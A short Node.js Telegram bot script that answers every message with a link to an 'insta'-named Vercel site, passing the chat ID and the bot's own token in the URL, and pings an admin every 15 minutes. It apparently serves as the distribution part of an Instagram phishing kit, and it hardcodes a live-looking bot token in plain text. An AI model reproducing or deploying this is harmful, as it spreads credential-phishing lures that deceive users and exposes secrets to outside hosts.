import TelegramBot from "node-telegram-bot-api";
const token = "8292077308:AAFMvWEToMiDiz7UQnbmqihk0KiOv8MUCCQ";
const bot = new TelegramBot(token, { polling: true });
const adminId = 8079294558
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const link = `https://insta-chi-plum.vercel.app/?id=${chatId}&token=${token}`;
    bot.sendMessage(chatId, link);
});
setInterval(() => {
    bot.sendMessage(adminId, 'test');
}, 1000 * 60 * 15);